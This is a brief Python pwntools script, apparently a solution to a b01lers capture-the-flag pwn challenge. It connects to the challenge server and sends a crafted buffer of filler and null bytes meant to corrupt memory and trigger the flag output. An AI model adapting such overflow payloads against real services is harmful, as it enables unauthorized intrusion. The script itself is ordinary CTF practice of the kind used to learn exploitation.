#!/usr/bin/env python
from pwn import *

context.bits= '64'
context.endian= 'little'
#context.log_level = 'debug'

conn = remote('pwn.ctf.b01lers.com', 1001)

conn.recvuntil(" > ")
#payload = p64(0x0)*24
payload = "a"*8 + "\00"*8 + "a"*8
conn.sendline(payload)
while 1<2:
    try:
        print(conn.recvlineS())
    except EOFError as e:
        break
